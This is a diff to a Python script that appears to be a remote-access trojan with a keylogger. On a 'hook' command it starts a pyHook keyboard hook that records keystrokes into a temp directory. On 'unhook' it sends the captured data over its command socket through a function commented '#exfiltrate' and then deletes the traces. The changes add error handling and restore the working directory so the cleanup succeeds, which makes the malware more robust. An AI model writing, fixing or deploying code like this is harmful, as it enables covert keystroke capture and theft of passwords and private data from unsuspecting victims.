@@ -37,6 +37,7 @@ def connect():
         if 'hook' in command:
             store=''
             dirpath = tempfile.mkdtemp()	#create temp directory
+            prevdir=os.getcwd()			#save the location of script
             os.chdir(dirpath)			#change current directory to created temp directory
             s.send('hooking')
             obj = pyHook.HookManager()
@@ -55,7 +56,12 @@ def connect():
                     pass
                 if 'unhook' in x:		#to unhook after hooking starts and extract from temp folder
                     obj.UnhookKeyboard()
-                    transfer(s,dirpath)		#exfiltrate
+                    try:
+                        transfer(s,dirpath)		#exfiltrate
+                    except Exception,e:
+                        s.send(str(e))
+                        pass
+                    os.chdir(prevdir)		#revert back to prev cwd to enable deleting created temp folder
                     s.send('unhooked and saved')
                     shutil.rmtree(dirpath)
                     break
